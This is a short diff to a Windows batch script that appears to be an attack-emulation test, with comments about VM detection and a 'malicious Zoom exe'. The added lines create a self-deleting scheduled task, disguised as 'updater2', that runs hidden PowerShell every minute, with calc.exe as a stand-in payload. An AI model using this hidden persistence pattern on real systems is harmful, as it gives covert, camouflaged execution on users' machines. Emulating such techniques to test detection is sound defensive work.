@@ -90,6 +90,9 @@ echo [NOT DETECTED] This system does not exhibit common virtual machine characte
 ::        change name of zoom exe
 ::        Download malicious Zoom exe to folder
 
+::    Unencoded Scheduled Task Command
+schtasks /CREATE /SC MINUTE /TN updater2 /TR "powershell.exe -w hidden -c calc.exe; schtasks /DELETE /TN updater2 /F"
+
 :end
 pause
 endlocal
